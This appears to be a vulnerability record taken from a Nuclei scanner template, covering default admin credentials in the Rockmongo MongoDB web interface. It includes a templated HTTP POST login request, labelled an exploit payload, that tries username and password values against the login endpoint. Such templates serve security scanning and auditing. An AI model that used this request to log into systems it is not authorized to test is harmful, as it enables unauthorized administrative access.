# Vulnerability: Rockmongo Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`rockmongo-default-login.yaml`)

## Description
Rockmongo default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /index.php?action=login.index HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Referer: {{Hostname}}/index.php?action=login.index

more=0&host=0&username={{username}}&password={{password}}&db=&lang=en_us&expire=3
```

